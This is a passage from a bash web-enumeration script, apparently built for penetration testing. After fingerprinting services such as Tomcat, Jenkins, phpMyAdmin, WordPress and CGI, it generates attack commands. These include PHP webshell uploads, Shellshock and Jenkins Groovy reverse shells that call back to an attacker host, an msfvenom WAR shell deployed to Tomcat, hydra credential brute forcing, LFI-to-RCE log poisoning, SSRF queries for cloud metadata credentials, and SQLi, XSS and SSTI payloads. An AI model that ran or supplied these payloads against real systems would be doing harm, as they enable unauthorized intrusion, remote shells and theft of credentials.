            "wget -r -np -nH --cut-dirs=1 ${url%/}/" \
            "grep -RniE 'pass|secret|key|token|cred|db_' . 2>/dev/null | head -50"
    fi

    local interesting_hits
    interesting_hits=$(grep -hiE '/(admin|upload|api|console|manager|phpmyadmin|wp-admin|cgi).*\| (200|301|302|401|403) \|' "$work_dir/content/"*.txt 2>/dev/null | awk '{print $1}' | head -4)
    if [[ -n "$interesting_hits" ]]; then
        local int_cmds=()
        while IFS= read -r found_url; do
            [[ -z "$found_url" ]] && continue
            int_cmds+=("curl -skI '${found_url}'")
        done <<< "$interesting_hits"
        append_next_finding "$next_file" \
            "Interesting directory or endpoint discovered" \
            "content ffuf output contains admin/upload/api/console-style path" \
            "${int_cmds[@]}"
    fi

    local cms_whatweb="$work_dir/fingerprint/whatweb.txt"
    local cms_paths="$work_dir/fingerprint/sensitive_paths.txt"

    # Why: wildcard hosts redirect /.git/HEAD to a 301/200 with no content. A real
    # exposed repo serves a body starting "ref: refs/heads/..." or a [core] block.
    if _confirm_fingerprint "$url" "/.git/HEAD" '^ref:[[:space:]]+refs/' "200" \
        || _confirm_fingerprint "$url" "/.git/config" '\[core\]' "200"; then
        append_next_finding "$next_file" \
            "Exposed Git repository found" \
            "/.git/HEAD served 'ref:' line or /.git/config served [core] section" \
            "curl -sk ${url%/}/.git/HEAD" \
            "git-dumper ${url%/}/.git ./git_$(get_host "$url")" \
            "grep -RniE 'pass|secret|key|token|cred|db_' ./git_$(get_host "$url") 2>/dev/null | head -50"
    fi

    local upload_hits
    upload_hits=$(grep -hiE '/(upload|uploads|filemanager|files|media).*(\| (200|301|302|401|403) \||\] http)' "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | awk '{print $1}' | head -3)
    if [[ -n "$upload_hits" ]]; then
        local upload_cmds=()
        local first_upload_url=""
        while IFS= read -r upload_url; do
            [[ -z "$upload_url" || "$upload_url" == \[* ]] && continue
            [[ -z "$first_upload_url" ]] && first_upload_url="$upload_url"
            upload_cmds+=("curl -skI '${upload_url}'")
            upload_cmds+=("ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u '${upload_url%/}/FUZZ' -mc 200,201,204,301,302,401,403")
        done <<< "$upload_hits"
        if [[ -n "$first_upload_url" ]]; then
            upload_cmds+=("# Extension/MIME bypass — create php shell with image extension:")
            upload_cmds+=("echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php")
            upload_cmds+=("curl -sk -F 'file=@/tmp/shell.php;type=image/jpeg' -F 'filename=shell.php.jpg' '${first_upload_url}'")
            upload_cmds+=("curl -sk -F 'file=@/tmp/shell.php;filename=shell.php5' '${first_upload_url}'")
            upload_cmds+=("# If upload succeeds, trigger shell:")
            upload_cmds+=("curl -sk '${url%/}/uploads/shell.php?cmd=id'   # adjust path to where files land")
        fi
        append_next_finding "$next_file" \
            "Upload or file-management path found" \
            "content/sensitive path output matched upload/files/media path" \
            "${upload_cmds[@]:0:10}"
    fi

    local cgi_hits
    cgi_hits=$(grep -hiE '/(cgi-bin|cgi)/.*(200|301|302)' "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | awk '{print $1}' | head -3)
    if [[ -n "$cgi_hits" ]]; then
        local cgi_cmds=()
        while IFS= read -r cgi_url; do
            [[ -z "$cgi_url" ]] && continue
            cgi_cmds+=("curl -skI '${cgi_url}'")
            cgi_cmds+=("# Shellshock test (CVE-2014-6271):")
            cgi_cmds+=("curl -sk -H 'User-Agent: () { :; }; echo; echo VULNERABLE' '${cgi_url}'")
            cgi_cmds+=("curl -sk -H 'User-Agent: () { :; }; /bin/bash -c \"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\"' '${cgi_url}'")
        done <<< "$cgi_hits"
        cgi_cmds+=("# Enumerate CGI scripts:")
        cgi_cmds+=("ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u ${url%/}/cgi-bin/FUZZ -mc 200,301,302,403")
        cgi_cmds+=("nmap --script http-shellshock -p $(get_port "$url") --script-args uri=/cgi-bin/test.cgi $(get_host "$url")")
        append_next_finding "$next_file" \
            "CGI script found — test for Shellshock" \
            "content output matched /cgi-bin/ or /cgi/ path with 200/301/302" \
            "${cgi_cmds[@]:0:10}"
    fi

    # Why: the word "swagger" shows up in HTML/JS for unrelated reasons. Require a
    # real JSON spec response containing "swagger" or "openapi" as a JSON key.
    if _confirm_fingerprint "$url" "/swagger.json" '"(swagger|openapi)"[[:space:]]*:' "200" \
        || _confirm_fingerprint "$url" "/openapi.json" '"(swagger|openapi)"[[:space:]]*:' "200" \
        || _confirm_fingerprint "$url" "/v2/api-docs" '"(swagger|openapi)"[[:space:]]*:' "200" \
        || _confirm_fingerprint "$url" "/swagger-ui/" '<title>[^<]*Swagger' "200"; then
        append_next_finding "$next_file" \
            "Swagger/OpenAPI surface found" \
            "live JSON spec or swagger-ui page confirmed" \
            "curl -sk ${url%/}/swagger.json | jq .info,.paths 2>/dev/null" \
            "curl -sk ${url%/}/openapi.json | jq .info,.paths 2>/dev/null" \
            "ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u '${url%/}/api/FUZZ' -mc 200,201,204,301,302,401,403"
    fi

    local api_hits
    api_hits=$(grep -hiE '/api(/|[? ]).*\| (200|201|204|301|302|401|403) \|' "$work_dir/content/"*.txt "$work_dir/content/recursive/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | awk '{print $1}' | head -4)
    if [[ -n "$api_hits" ]]; then
        local api_cmds=()
        while IFS= read -r api_url; do
            [[ -z "$api_url" ]] && continue
            api_cmds+=("curl -skI '${api_url}'")
            api_cmds+=("curl -sk '${api_url}' | jq . 2>/dev/null || curl -sk '${api_url}' | head -40")
        done <<< "$api_hits"
        api_cmds+=("ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u '${url%/}/api/FUZZ' -mc 200,201,204,301,302,401,403")
        append_next_finding "$next_file" \
            "API endpoint discovered" \
            "content output contains /api path with actionable HTTP response" \
            "${api_cmds[@]:0:8}"
    fi

    # Why: bare "spring" matches many unrelated words. Require /actuator to return
    # the characteristic HATEOAS JSON ("_links") or the Whitelabel error markup.
    if _confirm_fingerprint "$url" "/actuator" '"_links"[[:space:]]*:' "200" \
        || _confirm_fingerprint "$url" "/actuator/health" '"status"[[:space:]]*:[[:space:]]*"(UP|DOWN)"' "200" \
        || _confirm_fingerprint "$url" "/error" 'Whitelabel Error Page|org\.springframework'; then
        append_next_finding "$next_file" \
            "Spring actuator or Spring app indicators found" \
            "/actuator returned Spring HATEOAS JSON or Whitelabel error confirmed" \
            "curl -sk ${url%/}/actuator" \
            "curl -sk ${url%/}/actuator/env | jq . 2>/dev/null" \
            "ffuf -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u ${url%/}/FUZZ -mc 200,401,403"
    fi

    # Why: wordlist entries like /adminer match on wildcard hosts. Require the
    # Adminer login page body marker.
    if _confirm_fingerprint "$url" "/adminer.php" 'Adminer|<title>[^<]*Login' \
        || _confirm_fingerprint "$url" "/adminer/" 'Adminer|<title>[^<]*Login'; then
        append_next_finding "$next_file" \
            "Adminer detected" \
            "/adminer(.php)? served Adminer login body" \
            "curl -sk ${url%/}/adminer/ | sed -n '1,80p'" \
            "curl -sk ${url%/}/adminer.php | sed -n '1,80p'" \
            "hydra -l root -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/adminer.php:auth[server]=localhost&auth[username]=^USER^&auth[password]=^PASS^:F=Login failed'"
    fi

    # Why: /api/health returns JSON with "commit" + "version" on Grafana.
    if _confirm_fingerprint "$url" "/api/health" '"commit"[[:space:]]*:|"database"[[:space:]]*:' "200" \
        || _confirm_fingerprint "$url" "/login" '<title>[^<]*Grafana|grafana-app'; then
        local grafana_cmds=(
            "curl -sk ${url%/}/login | sed -n '1,80p'"
            "curl -sk ${url%/}/api/health"
        )
        grafana_cmds+=("nuclei -u ${url%/} -tags grafana")
        append_next_finding "$next_file" \
            "Grafana detected" \
            "/api/health returned Grafana JSON or /login served Grafana markup" \
            "${grafana_cmds[@]}"
    fi

    # Why: Webmin runs its own HTTP server (MiniServ) — the Server header or
    # /session_login.cgi landing page are distinctive.
    if _confirm_fingerprint "$url" "/" '^Server:[[:space:]]*MiniServ|<title>[^<]*Webmin' \
        || _confirm_fingerprint "$url" "/session_login.cgi" 'Webmin|MiniServ'; then
        append_next_finding "$next_file" \
            "Webmin detected" \
            "MiniServ server header or Webmin login page confirmed" \
            "curl -skI ${url%/}/" \
            "searchsploit webmin" \
            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} https-post-form '/session_login.cgi:user=^USER^&pass=^PASS^:F=Login failed'"
    fi

    # Why: require the real console login page or a JBoss-named Server header.
    if _confirm_fingerprint "$url" "/jmx-console/" 'JBoss|JMX Console|WildFly' \
        || _confirm_fingerprint "$url" "/web-console/" 'JBoss|WildFly' \
        || _confirm_fingerprint "$url" "/" '^Server:[[:space:]]*(JBoss|WildFly|Apache-Coyote.*JBoss)'; then
        append_next_finding "$next_file" \
            "JBoss/WildFly management surface found" \
            "JBoss/WildFly console served content or Server header confirmed" \
            "curl -skI ${url%/}/jmx-console/" \
            "curl -skI ${url%/}/web-console/" \
            "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
    fi

    # Why: ES exposes distinctive JSON on / (version.number + tagline) and
    # /_cluster/health (cluster_name + status).
    if _confirm_fingerprint "$url" "/" '"cluster_name"|"tagline"[[:space:]]*:[[:space:]]*"You Know, for Search"' "200" \
        || _confirm_fingerprint "$url" "/_cluster/health" '"cluster_name"[[:space:]]*:' "200"; then
        append_next_finding "$next_file" \
            "Elasticsearch indicators found" \
            "live JSON from / or /_cluster/health with cluster_name confirmed" \
            "curl -sk ${url%/}/_cluster/health?pretty" \
            "curl -sk ${url%/}/_cat/indices?v" \
            "curl -sk ${url%/}/_search?pretty -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}},\"size\":5}'"
    fi

    if is_nonempty_file "$work_dir/vhosts/hosts_entries.txt"; then
        local vhost_cmds=()
        while IFS= read -r vhost_entry; do
            [[ -z "$vhost_entry" ]] && continue
            local vhost_name
            vhost_name=$(echo "$vhost_entry" | awk '{print $2}')
            [[ -n "$vhost_name" ]] || continue
            vhost_cmds+=("echo '$vhost_entry' | sudo tee -a /etc/hosts")
            vhost_cmds+=("./webenum.sh --url $(get_proto "$url")://${vhost_name}")
        done < <(head -3 "$work_dir/vhosts/hosts_entries.txt")
        append_next_finding "$next_file" \
            "VHost discovered" \
            "$work_dir/vhosts/hosts_entries.txt is non-empty" \
            "${vhost_cmds[@]}"
    fi

    # Why: real WP serves /wp-login.php with WP-specific markup, or the homepage
    # has wp-content/wp-includes asset links.
    if _confirm_fingerprint "$url" "/wp-login.php" 'WordPress|wp-submit|name="log"' \
        || _confirm_fingerprint "$url" "/" '/wp-content/|/wp-includes/|<meta name="generator" content="WordPress'; then
        local wordpress_cmds=(
            "curl -sk ${url%/}/wp-login.php | sed -n '1,40p'"
            "wpscan --url ${url%/} --enumerate u,p,t --plugins-detection passive -o /tmp/${HOST_SAFE}_wpscan_baseline.txt"
        )
        wordpress_cmds+=(
            "wpscan --url ${url%/} --enumerate p --plugins-detection aggressive -o /tmp/${HOST_SAFE}_wpscan_plugins.txt"
            "wpscan --url ${url%/} --enumerate u,vp,vt,cb --plugins-detection aggressive -o /tmp/${HOST_SAFE}_wpscan_vuln.txt"
            "wpscan --url ${url%/} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt -o /tmp/${HOST_SAFE}_wpscan_users.txt"
        )
        append_next_finding "$next_file" \
            "WordPress detected" \
            "wp-login form body or wp-content/wp-includes assets confirmed" \
            "${wordpress_cmds[@]}"
    fi

    # Why: the word "administrator" matches the wildcard wordlist. Require the
    # Joomla generator meta tag or admin login form markup.
    if _confirm_fingerprint "$url" "/administrator/index.php" 'Joomla!|mod-login|name="username"' \
        || _confirm_fingerprint "$url" "/" '<meta name="generator" content="Joomla!'; then
        append_next_finding "$next_file" \
            "Joomla detected" \
            "Joomla generator meta tag or /administrator login body confirmed" \
            "joomscan --url ${url%/} --enumerate-components" \
            "curl -sk ${url%/}/administrator/ | sed -n '1,60p'" \
            "ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/joomla.fuzz.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
    fi

    # Why: real Drupal exposes X-Generator header or /sites/default asset paths.
    if _confirm_fingerprint "$url" "/" '<meta name="Generator" content="Drupal|^X-Generator:[[:space:]]*Drupal|/sites/default/files/' \
        || _confirm_fingerprint "$url" "/CHANGELOG.txt" '^Drupal [0-9]' "200" \
        || _confirm_fingerprint "$url" "/user/login" 'user-login-form|name="form_id" value="user_login'; then
        append_next_finding "$next_file" \
            "Drupal detected" \
            "Drupal generator meta/header, CHANGELOG.txt, or user-login-form confirmed" \
            "droopescan scan drupal -u ${url%/}" \
            "curl -sk ${url%/}/CHANGELOG.txt | head -20" \
            "curl -sk ${url%/}/user/login | sed -n '1,60p'"
    fi

    # Why: real Tomcat exposes Apache-Coyote Server header or Tomcat realm in the
    # manager's WWW-Authenticate / body. Wildcard paths don't.
    if _confirm_fingerprint "$url" "/manager/html" 'Tomcat|Apache Coyote|realm="Tomcat' \
        || _confirm_fingerprint "$url" "/manager/status" 'Tomcat|Apache Coyote' \
        || _confirm_fingerprint "$url" "/" '^Server:[[:space:]]*Apache-Coyote'; then
        append_next_finding "$next_file" \
            "Tomcat manager surface detected" \
            "Tomcat/Coyote Server header or manager realm confirmed" \
            "curl -skI ${url%/}/manager/html" \
            "curl -skI ${url%/}/manager/status" \
            "# Brute default creds (tomcat:tomcat, admin:admin, manager:manager, tomcat:s3cret):" \
            "hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt -P /usr/share/seclists/Passwords/tomcat-betterdefaults.txt -s $(get_port "$url") $(get_host "$url") $(get_proto "$url")-get /manager/html" \
            "# Build + deploy WAR shell:" \
            "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o /tmp/shell.war" \
            "curl -v -u 'tomcat:tomcat' --upload-file /tmp/shell.war '${url%/}/manager/text/deploy?path=/shell'" \
            "curl -sk ${url%/}/shell/   # trigger deployed shell (nc -lvnp 4444)"
    fi

    # Why: Jenkins sends X-Jenkins / X-Hudson headers; /api/json returns its
    # characteristic _class tree; login page has "Jenkins" in title.
    if _confirm_fingerprint "$url" "/" '^X-Jenkins:|^X-Hudson:' \
        || _confirm_fingerprint "$url" "/api/json" '"_class"[[:space:]]*:[[:space:]]*"hudson\.' \
        || _confirm_fingerprint "$url" "/login" '<title>[^<]*Jenkins|Jenkins-Crumb'; then
        append_next_finding "$next_file" \
            "Jenkins detected" \
            "Jenkins/Hudson header, /api/json _class tree, or login title confirmed" \
            "curl -sk ${url%/}/login | sed -n '1,80p'" \
            "curl -skI ${url%/}/script" \
            "# If /script accessible (unauthenticated or after login) — Groovy RCE:" \
            "curl -sk -X POST ${url%/}/script --data-urlencode 'script=println \"id\".execute().text'" \
            "# Groovy reverse shell (update KALI_IP/PORT):" \
            "curl -sk -X POST ${url%/}/script --data-urlencode 'script=def cmd=[\"bash\",\"-c\",\"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\"].execute()'" \
            "# Enumerate without auth (often accessible):" \
            "curl -sk ${url%/}/api/json?pretty=true | jq .jobs[].name" \
            "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
    fi

    # Why: phpMyAdmin login page has pma_username input or phpMyAdmin title/assets.
    if _confirm_fingerprint "$url" "/phpmyadmin/" 'pma_username|phpMyAdmin|<title>[^<]*phpMyAdmin' \
        || _confirm_fingerprint "$url" "/pma/" 'pma_username|phpMyAdmin' \
        || _confirm_fingerprint "$url" "/phpmyadmin/index.php" 'pma_username|phpMyAdmin'; then
        append_next_finding "$next_file" \
            "phpMyAdmin detected" \
            "phpMyAdmin login form (pma_username input) or title confirmed" \
            "curl -sk ${url%/}/phpmyadmin/ | sed -n '1,80p'" \
            "hydra -l root -P /usr/share/wordlists/fasttrack.txt -s $(get_port "$url") $(get_host "$url") $(get_proto "$url")-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'" \
            "# After login — read files:" \
            "# SQL> SELECT LOAD_FILE('/etc/passwd');" \
            "# SQL> SELECT LOAD_FILE('/var/www/html/config.php');" \
            "# After login — write webshell (need FILE privilege + know web root):" \
            "# SQL> SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';" \
            "curl -sk '${url%/}/shell.php?cmd=id'   # test webshell after writing"
    fi

    local param_lines
    param_lines=$(find "$work_dir/params" -name "*.txt" -exec grep -h '.' {} \; 2>/dev/null | grep -v '^No\|^-\|^URL' | head -3)
    if [[ -n "$param_lines" ]]; then
        local param_cmds=()
        local lfi_cmds=()
        local lfi_rce_cmds=()
        local rfi_cmds=()
        local cmdi_cmds=()
        local sqli_cmds=()
        local xss_cmds=()
        local ssti_cmds=()
        local ssrf_cmds=()
        while IFS= read -r param_line; do
            local param_url
            param_url=$(echo "$param_line" | awk '{print $1}')
            [[ "$param_url" == http* ]] || continue
            param_cmds+=("curl -sk '${param_url}' | head -40")
            param_cmds+=("curl -sk '${param_url/testvalue/1%27}' | head -60")
            param_cmds+=("curl -sk '${param_url/testvalue/1%20or%201=1}' | head -60")
            param_cmds+=("# LFI test:")
            param_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2Fetc%2Fpasswd}'")
            param_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")
            param_cmds+=("# XSS test:")
            param_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
            if echo "$param_url" | grep -qiE '[?&](file|path|page|include|template|view|doc|download|redirect|url)='; then
                lfi_cmds+=("# Try multiple traversal depths + absolute path:")
                lfi_cmds+=("for d in 1 2 3 4 5 6 7 8; do prefix=\$(printf '..%%2F%%.0s' \$(seq 1 \$d)); echo \"-- depth \$d --\"; curl -sk \"${param_url/testvalue/\${prefix}etc%2Fpasswd}\" | head -2; done")
                lfi_cmds+=("curl -sk '${param_url/testvalue/%2Fetc%2Fpasswd}'   # absolute path")
                lfi_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fetc%2Fpasswd%00}'   # null byte (PHP < 5.3)")
                lfi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")
                lfi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")

                # LFI-to-RCE escalation wrappers (manual execution — not auto-exploited)
                lfi_rce_cmds+=("# PHP filter wrapper — disclose source of PHP files (find creds in config):")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/php:%2F%2Ffilter%2Fconvert.base64-encode%2Fresource=index}' | tr -d '\\r\\n' | base64 -d")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/php:%2F%2Ffilter%2Fconvert.base64-encode%2Fresource=config}' | tr -d '\\r\\n' | base64 -d")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/php:%2F%2Ffilter%2Fconvert.base64-encode%2Fresource=..%2Fconfig%2Fdatabase}' | tr -d '\\r\\n' | base64 -d")
                lfi_rce_cmds+=("# data:// wrapper — direct PHP exec (needs allow_url_include=On):")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/data:%2F%2Ftext%2Fplain,%3C%3Fphp%20system(%24_GET%5B%22c%22%5D)%3B%20%3F%3E}&c=id'")
                lfi_rce_cmds+=("# expect:// wrapper — if expect PHP extension loaded:")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/expect:%2F%2Fid}'")
                lfi_rce_cmds+=("# Log poisoning — step 1 inject PHP in User-Agent, step 2 include access log:")
                lfi_rce_cmds+=("curl -sk -A '<?php system(\$_GET[\"c\"]); ?>' '${url%/}/'")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log}&c=id'")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log}&c=id'")
                lfi_rce_cmds+=("# Session-file poisoning (grab PHPSESSID from Set-Cookie first):")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_<PHPSESSID>}'")
                lfi_rce_cmds+=("# /proc/self/environ poisoning (send PHP in User-Agent, then read environ):")
                lfi_rce_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron}'")
            fi
            if echo "$param_url" | grep -qiE '[?&](url|uri|path|src|dest|redirect|callback|next|target|proxy|fetch|link|image|site|load|host|feed)='; then
                rfi_cmds+=("python3 -m http.server 8000 --directory /tmp")
                rfi_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F${KALI_IP}:8000%2Frfi.txt}'")

                # SSRF detection payloads (manual execution)
                ssrf_cmds+=("# Internal TCP port scan via SSRF:")
                ssrf_cmds+=("for p in 22 25 80 443 3306 5432 6379 8080 8443 9200 27017; do curl -sk -o /dev/null -w \"port \$p: %{http_code}  %{size_download}b\\n\" --max-time 5 \"${param_url/testvalue/http:%2F%2F127.0.0.1:\${p}%2F}\"; done")
                ssrf_cmds+=("# Localhost ports vs 0.0.0.0/169.254.169.254 (bypass filters):")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F127.0.0.1%2F}'")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F}'   # AWS metadata")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F}'")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F}' -H 'Metadata-Flavor: Google'   # GCP")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F169.254.169.254%2Fmetadata%2Finstance?api-version=2021-02-01}' -H 'Metadata: true'   # Azure")
                ssrf_cmds+=("# Protocol smuggling (file://, gopher://, dict://):")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/file:%2F%2F%2Fetc%2Fpasswd}'")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/gopher:%2F%2F127.0.0.1:6379%2F_INFO}'   # Redis smuggle")
                ssrf_cmds+=("curl -sk '${param_url/testvalue/dict:%2F%2F127.0.0.1:11211%2Fstats}'   # memcached stats")
            fi
            if echo "$param_url" | grep -qiE '[?&](cmd|exec|command|ping|host|ip|lookup|query|search)='; then
                cmdi_cmds+=("curl -sk '${param_url/testvalue/%3Bid}'")
                cmdi_cmds+=("curl -sk '${param_url/testvalue/%7Cwhoami}'")
                cmdi_cmds+=("curl -sk '${param_url/testvalue/%60id%60}'")
                cmdi_cmds+=("curl -sk '${param_url/testvalue/%24(id)}'")
                cmdi_cmds+=("# Time-based blind cmdi:")
                cmdi_cmds+=("time curl -sk '${param_url/testvalue/%3Bsleep%205}'")
                cmdi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u '${param_url/testvalue/FUZZ}' -mc all -fs 0")
            fi
            if echo "$param_url" | grep -qiE '[?&](id|item|product|cat|category|user|uid|pid|page_id|article)='; then
                sqli_cmds+=("curl -sk '${param_url/testvalue/1%27}' | head -60")
                sqli_cmds+=("curl -sk '${param_url/testvalue/1%20and%201=2}' | head -60")
                sqli_cmds+=("curl -sk '${param_url/testvalue/1%20or%201=1}' | head -60")
                sqli_cmds+=("curl -sk '${param_url/testvalue/1%22}' | head -60")
                sqli_cmds+=("# Time-based blind SQLi (MySQL/MariaDB):")
                sqli_cmds+=("time curl -sk '${param_url/testvalue/1%27%20AND%20SLEEP(5)--%20-}'")
                sqli_cmds+=("# UNION-based — determine column count first:")
                sqli_cmds+=("curl -sk '${param_url/testvalue/1%27%20ORDER%20BY%201--%20-}'")
                sqli_cmds+=("curl -sk '${param_url/testvalue/1%27%20UNION%20SELECT%201,2,3--%20-}'")
            fi
            if echo "$param_url" | grep -qiE '[?&](q|query|search|s|name|msg|message|comment|return|next|redirect|url)='; then
                xss_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
                xss_cmds+=("curl -sk '${param_url/testvalue/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E}'")
            fi
            # SSTI — template engines reflect math ops; test across common engines
            if echo "$param_url" | grep -qiE '[?&](template|view|msg|message|name|greeting|email|subject|comment|title|q|query|search|page)='; then
                ssti_cmds+=("# SSTI — if 49 appears in response, template engine is evaluating expressions")
                ssti_cmds+=("curl -sk '${param_url/testvalue/%7B%7B7*7%7D%7D}'           # Jinja2/Twig  → 49")
                ssti_cmds+=("curl -sk '${param_url/testvalue/%7B%7B7*%277%27%7D%7D}'     # Jinja2=7777777 / Twig=49 (differentiator)")
                ssti_cmds+=("curl -sk '${param_url/testvalue/%24%7B7*7%7D}'             # FreeMarker/Spring EL → 49")
                ssti_cmds+=("curl -sk '${param_url/testvalue/%3C%25%3D%207*7%20%25%3E}' # ERB (Ruby) → 49")
                ssti_cmds+=("curl -sk '${param_url/testvalue/%23%7B7*7%7D}'             # Smarty/Pebble/Velocity → 49")
                ssti_cmds+=("curl -sk '${param_url/testvalue/%25%7B7*7%7D}'             # Struts/OGNL → 49")
                ssti_cmds+=("# If Jinja2 confirmed — dump config + RCE via Python:")
                ssti_cmds+=("curl -sk '${param_url/testvalue/%7B%7B+config.items()+%7D%7D}'")
                ssti_cmds+=("# Jinja2 RCE payload (adjust Popen index after enumerating subclasses):")
                ssti_cmds+=("# {{ ''.__class__.__mro__[1].__subclasses__()[<Popen_idx>]('id',shell=True,stdout=-1).communicate() }}")
            fi
        done <<< "$param_lines"
        append_next_finding "$next_file" \
            "Parameter discovered" \
            "params output contains generated URL with parameter" \
            "${param_cmds[@]}"
        if (( ${#lfi_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "Traversal/LFI-style parameter found" \
                "parameter name suggests file/path/page/include/download handling" \
                "${lfi_cmds[@]:0:8}"
        fi
        if (( ${#lfi_rce_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "LFI-to-RCE wrappers (run after LFI confirmed)" \
                "PHP filter / data:// / log-poisoning / session-poisoning pivots" \
                "${lfi_rce_cmds[@]:0:14}"
        fi
        if (( ${#rfi_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "RFI-capable parameter name found" \
                "parameter name suggests URL/path loading behavior" \
                "${rfi_cmds[@]:0:4}"
        fi
        if (( ${#ssrf_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "SSRF-style parameter found" \
                "parameter name accepts URL — test internal ports, cloud metadata, protocol smuggling" \
                "${ssrf_cmds[@]:0:12}"
        fi
        if (( ${#cmdi_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "Command-injection-style parameter found" \
                "parameter name suggests command, ping, host, lookup, query, or search behavior" \
                "${cmdi_cmds[@]:0:8}"
        fi
        if (( ${#sqli_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "SQLi-style parameter found" \
                "parameter name suggests id/item/product/user/category lookup behavior" \
                "${sqli_cmds[@]:0:10}"
        fi
        if (( ${#xss_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "XSS-reflection-style parameter found" \
                "parameter name suggests search/message/comment/redirect reflection behavior" \
                "${xss_cmds[@]:0:6}"
        fi
        if (( ${#ssti_cmds[@]} > 0 )); then
            append_next_finding "$next_file" \
                "SSTI-candidate parameter found" \
                "parameter name suggests template/message/greeting reflection — test engine math ops" \
                "${ssti_cmds[@]:0:12}"
        fi
    fi

    if ! grep -q '^## ' "$next_file" 2>/dev/null; then
        echo "(no grounded web next-step commands generated)" >> "$next_file"
    fi
}

#==============================================================================
# PHASE 6 — SUMMARY GENERATION
#==============================================================================
generate_summary() {
    local url="$1"
    local work_dir="$2"
    local summary_dir="$work_dir/summary"
    mkdir -p "$summary_dir"

    phase "Phase 6 — Generating Summary"
    generate_next_steps "$url" "$work_dir"

    local proto=""
    proto=$(get_proto "$url")

    {
        echo "# webenum Summary"
        echo ""
        echo "**Target:** \`${url}\`"
        echo "**Date:** $(date '+%Y-%m-%d %H:%M')"
        echo "**Mode:** $(if [[ "$DEEP_MODE" == "true" ]]; then echo 'DEEP'; else echo 'STANDARD'; fi)"
        echo ""
        echo "---"
        echo ""

        # --- Technology Stack ---
        echo "## Technology Fingerprint"
        echo ""
        if [[ -f "$work_dir/fingerprint/whatweb.txt" ]]; then
            echo '```'
            head -5 "$work_dir/fingerprint/whatweb.txt" 2>/dev/null
            echo '```'
        fi
        echo ""

        # --- Headers of Interest ---
        echo "## Notable Headers"
        echo ""
        if [[ -f "$work_dir/fingerprint/headers.txt" ]]; then
            echo '```'
            grep -iE 'Server:|X-Powered-By:|X-Frame|Content-Security|Location:|Set-Cookie|WWW-Auth' \
